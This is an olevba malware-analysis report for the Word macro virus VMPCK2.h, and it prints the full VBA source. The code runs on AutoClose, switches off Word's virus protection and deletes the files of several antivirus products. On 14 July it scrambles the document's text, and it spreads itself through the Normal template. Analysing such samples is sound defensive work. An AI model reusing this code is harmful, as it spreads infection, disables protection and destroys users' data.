olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK2.h-d48fd0876a4c1efa7c71c82510d1d40204de1e4f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK2.h-d48fd0876a4c1efa7c71c82510d1d40204de1e4f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gp808.bas 
in file: Virus.MSWord.VMPCK2.h-d48fd0876a4c1efa7c71c82510d1d40204de1e4f - OLE stream: 'Macros/VBA/Gp808'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
.ScreenUpdating = False
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Application.VBE.ActiveVBProject.VBComponents("Gp808").Export "C:\Gp808.sys"
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN\*.*")
Kill ("C:\PROGRAMME\MCAFEE\VIRUSSCAN95\*.*")
Kill ("C:\Programme\Norton Antivirus\V32scan.dll")
Kill ("C:\Programme\Norton Antivirus\Virscan.dat")
Kill ("C:\PROGRAMME\TBAV\TBAV.DAT")
Kill ("C:\TBAV\TBAV.DAT")
Kill ("C:\Programme\Dr Solomon's\Anti-Virus Toolkit\*.*")
If Day(Now()) = 14 And Month(Now()) = 7 Then
Dim a As Variant
Dim b As Variant
Selection.WholeStory
a = Selection
For i = 1 To Len(a)
b = Mid$(a, i, 1)
c = Asc(Mid$(a, i, 1))
d = c + 29
If d > 199 Then c = 30
e$ = e$ + Chr(d)
Next i
Selection.WholeStory
Selection.Cut
WordBasic.Insert e$
End If
Set Nw807 = ActiveDocument.VBProject.VBComponents
Set Ru898 = NormalTemplate.VBProject.VBComponents
For y = 1 To Ru898.Count
If Ru898(y).Name = "Gp808" Then Nw515 = True
Next y
For y = 1 To Nw807.Count
If Nw807(y).Name = "Gp808" Then Ew593 = True
Next y
If Nw515 = True And Ew593 = True Then Exit Sub
If Nw515 = True And Ew593 <> True Then Nw807.Import "c:\Gp808.sys": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Nw515 <> True And Ew593 = True Then Ru898.Import "c:\Gp808.sys": NormalTemplate.Save
End Sub
Sub ExtrasMakro()
End Sub
Sub AnsichtCode()
End Sub
Sub AnsichtVBCode()
End Sub
Sub DateiDokVorlagen()
End Sub
Sub FormatFormatvorlage()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |V32scan.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

